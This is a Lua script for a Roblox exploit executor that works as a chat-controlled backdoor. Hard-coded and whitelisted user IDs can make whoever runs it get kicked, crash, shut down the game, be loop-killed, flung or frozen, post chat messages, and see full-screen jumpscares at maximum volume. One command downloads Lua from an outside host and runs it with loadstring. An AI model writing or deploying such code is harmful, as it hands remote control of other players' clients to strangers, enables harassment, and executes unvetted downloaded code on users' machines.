local COMMAND_PREFIX = ".";
local IDENTIFIER_ALL = "*";
local MAIN_WHITELISTED_IDS = {
    2823434956,
    405922557
};
local SECONDARY_WHITELISTED_IDS = {};

local cloneref = cloneref or function(...) return ...; end;
local function getService(service)
	return cloneref(game:GetService(service))
end;

local teleportService = getService("TeleportService")
local contentProvider = getService("ContentProvider")
local runService = getService("RunService")
local players = getService("Players")
local textChatService = getService("TextChatService")
local replicatedStorage = getService("ReplicatedStorage")
local soundService = getService("SoundService")
local debris = getService("Debris")
local httpService = getService("HttpService")
local userInputService = getService("UserInputService")
local coreGui = getService("CoreGui")
local tweenService = getService("TweenService")
local lighting = getService("Lighting")
local camera = workspace.CurrentCamera;

local isLegacyChat = textChatService.ChatVersion == Enum.ChatVersion.LegacyChatService;
local jobId = game.JobId;

local G = getgenv()
if G[jobId] then
	G[jobId]()
	task.wait(1)
end;

local player = players.LocalPlayer;
local character = player.Character or player.CharacterAdded:Wait();
local humanoid = character:WaitForChild("Humanoid", 10);
local humanoidRootPart = humanoid and humanoid.RootPart or humanoid:WaitForChild("HumanoidRootPart", 10);

local drunkScript = game:HttpGet("https://absent.wtf/drunk.lua")
local userName = tostring(player)
local displayName = player.DisplayName;

local commands, aliases, connections = {}, {}, {};
local following, followTarget = false, nil;
local looping = {};
local Anchored = false;

local audioCommands = {
    creepy = {"157636218", {"shiver", "xd"}},
    knock = {"5236308259", {"xd2"}},
    elevatorjam = {"131371906028599", {"ejam", "jam"}}
};

local scaryFaces = {
    "9565121852",
    "13812091235",
    "5182578556",
    "99181901800612",
    "13193479764",
    "12527364300",
    "136342594291398",
    "10970697149",
    "121616559982446"
};

local scarySounds = {
    "5710016194",
    "161964303",
    "126552929107766",
    "84131007103998",
    "123124825019861",
    "81987511375108"
};

local function newInstance(className, properties)
    local obj = Instance.new(className)

    if properties then
        for key, value in properties do
            obj[key] = value;
        end;
    end;

    return obj;
end;

local function playFlashbang(options)
    local playerGui = player:WaitForChild("PlayerGui")

    local screenGui = newInstance("ScreenGui", {
        IgnoreGuiInset = true,
        DisplayOrder = 999999,
        ResetOnSpawn = false,
        Parent = playerGui
    })

    local imageLabel = newInstance("ImageLabel", {
        Size = UDim2.fromScale(1, 1),
        BackgroundTransparency = 1,
        Image = options.imageId,
        ImageTransparency = 1,
        ZIndex = 999999,
        Parent = screenGui
    })

    local whiteFrame = newInstance("Frame", {
        Size = UDim2.fromScale(1, 1),
        BackgroundColor3 = Color3.new(1, 1, 1),
        BackgroundTransparency = 1,
        ZIndex = 999998,
        Parent = screenGui
    })

    contentProvider:PreloadAsync({ options.imageId, options.soundId })

    local sound = newInstance("Sound", {
        SoundId = options.soundId,
        Volume = options.volume or 10,
        Parent = soundService
    })
    sound:Play()

    tweenService:Create(imageLabel, TweenInfo.new(0.1), { ImageTransparency = 0 }):Play()
    task.wait(options.imageTime or 1)

    tweenService:Create(imageLabel, TweenInfo.new(0), { ImageTransparency = 1 }):Play()
    tweenService:Create(whiteFrame, TweenInfo.new(0), { BackgroundTransparency = 0 }):Play()

    task.wait(math.max(sound.TimeLength - 0.5, 0))
    screenGui:Destroy()
    sound:Destroy()
end;

local function addConnection(A, Callback)
    local connection = A:Connect(Callback)
    connections[#connections + 1] = connection;
    return connection;
end;

local function compareText(original, comparison)
    return string.match(string.lower(original), string.lower(comparison))
end;

local function getPlayer(input)
    if not input or type(tonumber(input)) == "number" then
        return false;
    end;

	local allPlayers = players:GetPlayers()

	if allPlayers[input] then
		return allPlayers[input];
	end;

    for _,v in allPlayers do
        if v ~= player and (compareText(tostring(v), input) or compareText(v.DisplayName, input)) then
            return v;
        end;
    end;

    return false;
end

local function registerCommand(commandName, commandAliases, requireArguments, commandCallback, isAdminCommand)
    commandName = string.lower(commandName)

    commands[commandName] = {
        name = commandName,
        func = commandCallback,
        requireArguments = requireArguments,
        isAdminCommand = isAdminCommand
    };

    for i = 1,#commandAliases do
        aliases[string.lower(commandAliases[i])] = commandName;
    end;
end;

local function handleMessage(caller, message)
    if #message <= 1 or string.sub(message, 1, 1) ~= COMMAND_PREFIX then
        return;
    end;

    local arguments = string.split(string.sub(message, 2), " ")
    local executedCommand = string.lower(arguments[1])
    local commandData = commands[executedCommand] or (aliases[executedCommand] and commands[aliases[executedCommand]]) or false;

	if not commandData then return; end;
	if commandData.requireArguments and not arguments[2] then return; end;
    if commandData.requireArguments and arguments[2] ~= IDENTIFIER_ALL and (not compareText(userName, arguments[2]) and not compareText(displayName, arguments[2])) then return; end;
    
    local callArguments = {};
    for i = commandData.requireArguments and 3 or 2, #arguments do
        callArguments[#callArguments + 1] = arguments[i];
    end;

    if commandData.isAdminCommand then
        if not table.find(MAIN_WHITELISTED_IDS, caller.UserId) then
            return;
        end;
    end;

    pcall(commandData.func, caller, unpack(callArguments))
end;

local function sendChat(message)
    if not message or #message == 0 then return; end;

    if isLegacyChat then
        local chatRemote = replicatedStorage:FindFirstChild("SayMessageRequest", true)
    	return chatRemote:FireServer(message, "All");
	end;

	local chat = textChatService.ChatInputBarConfiguration.TargetTextChannel;
    local textChannels = textChatService:FindFirstChild("TextChannels") or false
	local generalChannel = textChannels and textChannels:FindFirstChild("RBXGeneral")

	return (generalChannel and generalChannel or chat):SendAsync(message)
end;

local function playSound(id)
	local sound = Instance.new("Sound", soundService)
	sound.SoundId = "rbxassetid://" .. id;
	sound.Volume = 100;
	sound:Play()
	task.spawn(function()
		task.wait(.5)
		task.wait(sound.TimeLength-.5)
		sound:Destroy()
	end)
end;

registerCommand("kick", {"ban"}, true, function(caller, ...)
    player:Kick(#{...} > 0 and table.concat({...}, " ") or "");
end, true)

registerCommand("chat", {"ch", "say"}, true, function(caller, ...)
    sendChat(#{...} > 0 and table.concat({...}, " ") or "Hello!")
end)

registerCommand("crash", {}, true, function()
    while true do end;
end, true)

registerCommand("close", {"shutdown"}, true, function()
    game:Shutdown()
end, true)

registerCommand("bring", {"br"}, true, function(caller)
    if not caller.character or not caller.character:FindFirstChildOfClass("Humanoid") or not caller.character:FindFirstChildOfClass("Humanoid").RootPart then
        return false, "Missing HumanoidRootPart";
    end;
    
    if not humanoid or not humanoidRootPart or not character then
        return false, "missing parts";
    end;

	if Anchored then
		humanoidRootPart.Anchored = false;
		task.wait(.1)
	end;

    humanoidRootPart.CFrame = caller.character:FindFirstChildOfClass("Humanoid").RootPart.CFrame;

	if Anchored then
		task.wait(.1)
		humanoidRootPart.Anchored = true;
	end;
end)

registerCommand("kill", {}, true, function(caller)
    if not humanoid or not humanoidRootPart or not character then
        return false, "missing parts";
    end;

    humanoid.Health = 0;
end)

registerCommand("reset", {"re"}, true, function(caller)
    if not humanoid or not humanoidRootPart or not character then
        return false, "missing parts";
    end;

	local oldHumanoidRootPart = humanoidRootPart;
    local oldPosition = humanoidRootPart.CFrame;
    humanoid.Health = 0;
	player.CharacterAdded:Wait()
	task.spawn(function()
		repeat task.wait() until humanoidRootPart ~= oldHumanoidRootPart;
		humanoidRootPart.CFrame = oldPosition
	end)
end)

registerCommand("flashbang", {}, true, function()
    playFlashbang({
        imageId = "rbxassetid://11088883735",
        soundId = "rbxassetid://129172304986568",
        imageTime = 1,
        whiteFadeTime = 0.2,
        volume = 10
    })
end)

registerCommand("freeze", {"lock"}, true, function(caller)
    if not humanoid or not humanoidRootPart or not character then
        return false, "missing parts";
    end;

	Anchored = true;
    humanoidRootPart.Anchored = true;
end)

registerCommand("thaw", {"unfreeze", "unlock"}, true, function(caller)
    if not humanoid or not humanoidRootPart or not character then
        return false, "missing parts";
    end;

	Anchored = false;
    humanoidRootPart.Anchored = false;
end)

registerCommand("jump", {"jmp", "unsit"}, true, function(caller)
    if not humanoid or not humanoidRootPart or not character then
        return false, "missing parts";
    end;

	humanoid.Sit = false;
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
end)

registerCommand("sit", {}, true, function(caller)
    if not humanoid or not humanoidRootPart or not character then
        return false, "missing parts";
    end;

    humanoid.Sit = true;
end)

registerCommand("fling", {"fl", "yeet"}, true, function(caller)
    if not humanoid or not humanoidRootPart or not character then
        return false, "missing parts";
    end;

    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = Vector3.new(math.random(-100, 100), math.random(50, 150), math.random(-100, 100))
    bodyVelocity.MaxForce = Vector3.new(1e200, 1e200, 1e200)
    bodyVelocity.Parent = humanoidRootPart;
    debris:AddItem(bodyVelocity, .5)
end)

registerCommand("fling2", {"fl2", "yeet2"}, true, function(caller)
    if not humanoid or not humanoidRootPart or not character then
        return false, "missing parts";
    end;

    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
    bodyVelocity.MaxForce = Vector3.new(1e200, 1e200, 1e200)
    bodyVelocity.Parent = humanoidRootPart;
    debris:AddItem(bodyVelocity, .5)
end)

registerCommand("trip", {}, true, function(caller)
    if not humanoid or not humanoidRootPart or not character then
        return false, "missing parts";
    end;

    humanoid.PlatformStand = true;
    humanoidRootPart.Velocity = humanoidRootPart.CFrame.lookVector * 10 + Vector3.new(0, 10, 0)
	humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(90, 90, 90)
	task.wait(2)
    humanoid.PlatformStand = false;
end)

for i,v in audioCommands do
    registerCommand(i, v[2], true, function(caller)
        playSound(v[1])
    end, v[3] == nil)
end;

registerCommand("dance", {"dnc"}, true, function(caller)
    sendChat("/e dance")
end)

registerCommand("drunk", {"dr"}, true, function(caller)
    loadstring(drunkScript)()
end)

registerCommand("high", {"hh"}, true, function(caller)
    loadstring(string.rep(string.format("task.spawn(function() %s end);", drunkScript), 15))() -- lol
end)

registerCommand("blur", {"blr"}, true, function(caller, amount)
    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Size = tonumber(amount) or 15;
    blurEffect.Parent = lighting;

    task.wait(10)
    blurEffect:Destroy()
end)

registerCommand("earthquake", {"quake"}, true, function(caller, amount)
    local duration = tonumber(amount) or 10;
    local startTime = tick()

    local connection
    connection = runService.RenderStepped:Connect(function()
        if tick() - startTime > duration then
            connection:Disconnect()
            return;
        end;
        
        camera.CFrame *= CFrame.new(math.random(-2, 2) / 10, math.random(-2, 2) / 10, 0)
    end)
end)

for i = 2,3 do
    local num = tostring(i)

    registerCommand("dance" .. num, {"dnc" .. num}, true, function(caller)
        sendChat("/e dance" .. num)
    end)
end;

registerCommand("jumpscare", {"jp", "lol"}, true, function(caller)
	local selectedSound = "rbxassetid://" .. scarySounds[math.random(1,#scarySounds)];
    local selectedFace  = "rbxassetid://" .. scaryFaces[math.random(1,#scaryFaces)]; 
    
    local jumpscareGui = Instance.new("ScreenGui")
	jumpscareGui.DisplayOrder = 10;
	jumpscareGui.ResetOnSpawn = false;
	jumpscareGui.Enabled = true;
	jumpscareGui.IgnoreGuiInset = true;

	local image = Instance.new("ImageLabel")
	image.Size = UDim2.new(1, 0, 1, 0)
	image.Position = UDim2.new(0, 0, 0, 0)
	image.Image = selectedFace;
    image.BackgroundTransparency = .99;

	local sound = Instance.new("Sound", soundService)
	sound.SoundId = selectedSound;
	sound.Volume = 100;

    task.spawn(function()
        contentProvider:PreloadAsync({
            selectedFace,
            selectedSound
        })

        jumpscareGui.Parent = (gethui and gethui() or coreGui)
        image.Parent = jumpscareGui;

        sound:Play()

        task.wait(sound.TimeLength >= 3 and 3 or sound.TimeLength)

        jumpscareGui:Destroy()
        sound:Destroy()
    end)
end, true)

registerCommand("follow", {}, true, function(caller, targetName)
    local target = getPlayer(targetName) or caller;

    if target then
        following, followTarget = true, target;
    end;
end)

registerCommand("unfollow", {}, true, function(caller)
    following, followTarget = false, nil;
end)

registerCommand("walkspeed", {"speed", "ws"}, true, function(caller, speedStr)
    local speed = tonumber(speedStr) or 16;
    
    humanoid.WalkSpeed = speed;
end)

registerCommand("walkto", {}, true, function(caller, destName)
    local dest = getPlayer(destName) or caller;
    
    humanoid:MoveTo(dest.Character.HumanoidRootPart.Position)
end)

registerCommand("orbit", {}, true, function(caller, aroundName)
    local around = getPlayer(aroundName) or caller;
    local amount = tonumber(aroundName);

    if amount and type(amount) == "number" and amount <= 0 then
        return;
    end;

    task.spawn(function()
        for i = 1, 360*amount do
            if character and humanoidRootPart and around.Character and around.Character:FindFirstChild("HumanoidRootPart") then
                local angle = math.rad(i)
                local target = around.Character.HumanoidRootPart.Position;
                local x = target.X + math.cos(angle) * 10;
                local z = target.Z + math.sin(angle) * 10;

                local currentRotation = humanoidRootPart.CFrame - humanoidRootPart.Position;
                humanoidRootPart.CFrame = CFrame.new(x, target.Y, z) * currentRotation;
                task.wait()
            end;
        end;
    end)
end)

registerCommand("circle", {}, true, function(caller, amount)
    local amount = tonumber(amount);

    if amount and type(amount) == "number" and amount <= 0 then
        return;
    end;

    task.spawn(function()
        local startPos = humanoidRootPart.Position;
        for i = 1, 360*amount do
            if character and humanoidRootPart then
                local angle = math.rad(i)
                local x = startPos.X + math.cos(angle) * 5;
                local z = startPos.Z + math.sin(angle) * 5;

                local currentRotation = humanoidRootPart.CFrame - humanoidRootPart.Position;
                humanoidRootPart.CFrame = CFrame.new(x, startPos.Y, z) * currentRotation;

                task.wait(0)
            end
        end
    end)
end)

registerCommand("beyblade", {"bb"}, true, function(caller, target)
    task.spawn(function()
        for i = 1, 360 do
            if humanoidRootPart then
                humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(i), 0)
                task.wait(.015)
            end;
        end;
    end)
end)

registerCommand("rejoin", {"rj"}, true, function(caller)
    teleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
end)

registerCommand("spin", {}, true, function(caller, target)
    task.spawn(function()
        for i = 1, 36 do
            if humanoidRootPart then
                humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(10), 0)
                task.wait(.05)
            end;
        end;
    end)
end)

registerCommand("stun", {}, true, function(caller)
    humanoid.PlatformStand = true;
end)

registerCommand("unstun", {}, true, function(caller)
    humanoid.PlatformStand = false;
end)

registerCommand("loopkill", {}, true, function(caller)
    looping[player.UserId] = {
        type = "kill",
        target = player
    };
end, true)

registerCommand("unloopkill", {}, true, function(caller)
    looping[player.UserId] = nil;
end, true)

registerCommand("invert", {}, true, function(caller)
    local movementController = require(player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls()

    movementController.moveFunction = function(player, direction, relative)
        player.Move(player, -direction, relative)
    end;
    
    task.spawn(function() 
        task.wait(10) 
        movementController.moveFunction = function(player, direction, relative)
            player.Move(player, direction, relative)
        end;
    end)
end)

registerCommand("uninvert", {}, true, function(caller)
    local movementController = require(player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls()

    movementController.moveFunction = function(player, direction, relative)
        player.Move(player, direction, relative)
    end;
end)

registerCommand("whitelist", {"wl"}, true, function(caller, targetName)
    local target = getPlayer(targetName)

    if not target or target == player then
        return false, "Target player not found";
    end;
    
    if table.find(MAIN_WHITELISTED_IDS, target.UserId) then
        return false, "Is better than you.";
    end

    if table.find(SECONDARY_WHITELISTED_IDS, target.UserId) then
        return false, target.DisplayName .. " is already whitelisted";
    end
    
    table.insert(SECONDARY_WHITELISTED_IDS, target.UserId)
    
    sendChat(target.DisplayName .. " has been whitelisted by " .. caller.DisplayName .. "!")
end, true)

registerCommand("unwhitelist", {"unwl"}, true, function(caller, targetName)
    local target = getPlayer(targetName)
    
    if target == player or not target then
        return false, "target player not found"
    end;
    
    local index = table.find(SECONDARY_WHITELISTED_IDS, target.UserId)
    if not index then
        return false, target.DisplayName .. " is not whitelisted";
    end;
    
    table.remove(SECONDARY_WHITELISTED_IDS, index)
    
    sendChat(target.DisplayName .. " has been removed from whitelist by " .. caller.DisplayName .. "!")
end, true)

registerCommand("listwhitelist", {"lwl"}, true, function(caller)
    local whitelistedNames = {}
    
    for i,v in SECONDARY_WHITELISTED_IDS do
        local player = players:GetPlayerByUserId(v)
        if player then
            table.insert(whitelistedNames, player.DisplayName)
        else
            table.remove(SECONDARY_WHITELISTED_IDS, v)
        end;
    end;
    
    if #whitelistedNames == 0 then
        sendChat("Whitelisted: None")
        return;
    end;
    
    sendChat("Whitelisted: " .. table.concat(whitelistedNames, ", "))
end, true)

addConnection(player.CharacterAdded, function(newcharacter)
	Anchored = false;

    repeat runService.Heartbeat:Wait() until newcharacter and newcharacter:FindFirstChildOfClass("Humanoid") and newcharacter:FindFirstChildOfClass("Humanoid").RootPart;
    character = newcharacter;
    humanoid = character and character:FindFirstChildOfClass("Humanoid") or false;
    humanoidRootPart = humanoid and humanoid.RootPart or false;
end)

addConnection(textChatService.TextChannels.RBXGeneral.MessageReceived, function(message)
	local textSource = message and message.TextSource or false;
	
	if not textSource or (not table.find(MAIN_WHITELISTED_IDS, textSource.UserId) and not table.find(SECONDARY_WHITELISTED_IDS, textSource.UserId)) then
		return;
	end;

	handleMessage(players:GetPlayerByUserId(textSource.UserId), message.Text)
end)

addConnection(runService.Heartbeat, function()
    if following and followTarget and followTarget.Character and followTarget.Character.HumanoidRootPart and humanoidRootPart and humanoid then
        local dist = (player.Character.HumanoidRootPart.Position - followTarget.Character.HumanoidRootPart.Position).Magnitude
        
        if dist > 5 then 
            player.Character.Humanoid:MoveTo(followTarget.Character.HumanoidRootPart.Position) 
        end;
    elseif not followTarget or not followTarget.Character then 
        following, followTarget = false, nil;
    end;
    
    for _,data in looping do
        if data.type == "kill" and data.target and data.target.Character and data.target.Character.Humanoid then
            data.target.Character.Humanoid.Health = 0;
        end;
    end;
end)
 
G[jobId] = function()
	for i,v in connections do
		v:Disconnect()
	end;

	G[jobId] = nil;
end;
